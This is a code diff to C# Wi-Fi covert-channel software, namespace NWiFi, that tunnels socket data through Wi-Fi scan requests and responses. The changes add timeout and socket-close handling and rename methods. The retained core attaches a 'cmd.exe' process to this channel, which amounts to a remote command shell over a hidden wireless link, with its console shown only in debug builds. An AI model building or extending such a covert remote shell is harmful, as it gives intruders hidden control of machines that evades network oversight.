@@ -90,9 +90,18 @@ namespace NWiFi
             this.dataPushedSignal.Set();
         }
 
-        public void waitForData()
+        public bool waitForData(int timeoutMillis = -1)
         {
-            while (Count == 0) this.dataPushedSignal.WaitOne();
+            if (timeoutMillis < 0)
+            {
+                while (Count == 0) this.dataPushedSignal.WaitOne();
+                return true;
+            }
+
+            //waiting with timeout
+            this.dataPushedSignal.WaitOne(timeoutMillis);
+            if (Count == 0) return false;
+            return true;
         }
 
         public T pop()
@@ -500,6 +509,7 @@ namespace NWiFi
         private void onDisconnect()
         {
             Console.WriteLine("Connection reset from server");
+            this.state = SocketState.CLOSE;
         }
 
         public bool Connect(IntPtr nativeWiFiClientHandle, Guid if_guid, byte srvID = 8)
@@ -692,7 +702,7 @@ namespace NWiFi
 
             bool indata_in_last_run = false;
 
-            while (true)
+            while (this.state == SocketState.STATE_OPEN)
             {
                 Console.WriteLine("=========== SCAN ====================");
                 Packet2[] resps = NativeWifi.SendRecv(handle, this.if_guid, req, true); 
@@ -836,6 +846,7 @@ namespace NWiFi
                 Console.WriteLine("=========== SCAN END ====================");
             }
 
+            Console.WriteLine("Stopping send/receive thread for ClientSocket, because socket isn't not in OPEN state.");
         }
 
         public bool hasInData()
@@ -854,7 +865,10 @@ namespace NWiFi
             //ToDo: Remove after testing
             //if (buffer.Length < this.MTU) return -3;
 
-            if (blocking) this.in_queue.waitForData();
+            if (blocking)
+            {
+                while (this.state == SocketState.STATE_OPEN && !this.in_queue.waitForData(200)); //Block till data arrived, but interrupt every 200 ms to deal with closed socket
+            }
 
             if (this.in_queue.Count == 0) return 0;
 
@@ -1455,7 +1469,7 @@ namespace NWiFi
                 csock.Send(outbytes, outbytes.Length, true);
             }
 
-            public bool bind()
+            public bool attachSubProcToSocket()
             {
                 this.psi = new ProcessStartInfo(command)
                 {
@@ -1474,7 +1488,7 @@ namespace NWiFi
 
                 //folowing loop needs to be moved to dedicated thread
                 int rcv_len;
-                while (true)
+                while (csock.state == SocketState.STATE_OPEN)
                 {
                     String instr = "";
                     //if socket has input, read it and write to proc stdin
@@ -1491,6 +1505,9 @@ namespace NWiFi
                         this.proc.StandardInput.Flush();
                     }
                 }
+                Console.WriteLine(String.Format("Socket closed ... ending listening process '{0}'", this.command));
+                this.proc.Close();
+                this.proc.Dispose();
 
                 return true;
             }
@@ -1504,7 +1521,7 @@ namespace NWiFi
         static extern bool AllocConsole();
 #endif
 
-        public static String test()
+        public static String run()
         {
 #if DEBUG
             AllocConsole();
@@ -1548,64 +1565,12 @@ namespace NWiFi
 
 
                 ClientSubProc cp = new ClientSubProc(wsock, "cmd.exe");
-                cp.bind();
+                cp.attachSubProcToSocket();
 
-                //int count = 0;
-                
-                byte[] rcvbuf = new byte[wsock.MTU];
-
-
-                //byte[] sendbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("Hello from client\n", count));
-
-                while (true)
-                {
-                    //byte[] sendbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("Hello from client (count {0}). Additional chars to exceed SSID limit\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\n", count));
-                    //count++;
-                    //wsock.Send(sendbuf, sendbuf.Length);
-                    
-
-                    
-       //             if (wsock.hasInData())
-                    {
-                        int rcv_len = wsock.Receive(rcvbuf);
-
-                        if (rcv_len > 0)
-                        {
-                            Console.WriteLine(String.Format("Received {0} bytes of data\n=================", rcv_len));
-                            //Convert indata to UTF8 String
-                            String instr = System.Text.Encoding.UTF8.GetString(rcvbuf, 0, rcv_len);
-                            Console.WriteLine(String.Format("INDATA: {0}", instr));
-
-                            //Echo back
-                            wsock.Send(rcvbuf, rcv_len);
-                        }
-                        else
-                        {
-                            switch(rcv_len)
-                            {
-                                case 0:
-                                    Console.WriteLine("Empty buffer recieved");
-                                    break;
-                                case -1:
-                                    Console.WriteLine("Socket not connected");
-                                    break;
-                                case -2:
-                                    Console.WriteLine("Receive buffer is null");
-                                    break;
-                                case -3:
-                                    Console.WriteLine("Receive buffer is smaller than MTU.");
-                                    break;
-                            }
-
-                        }
-                            
-                    }
-                    
-                    
-                }
+               
 
                 //Avoid exitting lib
-                Console.Read();
+                //Console.Read();
                 
 
                 
